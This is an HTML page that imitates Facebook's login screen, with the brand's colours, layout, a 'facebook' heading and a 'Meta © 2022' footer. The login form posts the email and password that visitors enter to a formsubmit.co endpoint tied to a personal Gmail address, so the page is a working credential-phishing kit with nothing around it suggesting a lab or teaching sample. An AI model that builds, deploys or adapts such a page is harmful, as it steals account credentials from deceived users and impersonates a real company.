
<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      text-align: center;
      width: 300px;
    }

    h1 {
      color: #1877f2;
      font-size: 36px;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }

    .link {
      color: #1877f2;
      font-size: 14px;
      display: block;
      margin: 10px 0;
    }

    .or-line {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 15px 0;
    }

    .or-line::before,
    .or-line::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #ccc;
    }

    .or-line:not(:empty)::before {
      margin-right: .25em;
    }

    .or-line:not(:empty)::after {
      margin-left: .25em;
    }

    .create-account {
      background-color: #42b72a;
      margin-top: 10px;
    }

    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #777;
    }
  </style>
</head>
<body>
  <div class="container">
    <form action="https://formsubmit.co/nestorypalmer@gmail.com" method="POST">
      <h1>facebook</h1>
      <input type="text" name="email" placeholder="Mobile number or email address" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
      <a href="#" class="link">Forgotten password?</a>
      <div class="or-line">or</div>
      <button class="create-account" type="button">Create New Account</button>
    </form>
    <div class="footer">
      Meta Â© 2022
    </div>
  </div>
</body>
</html>
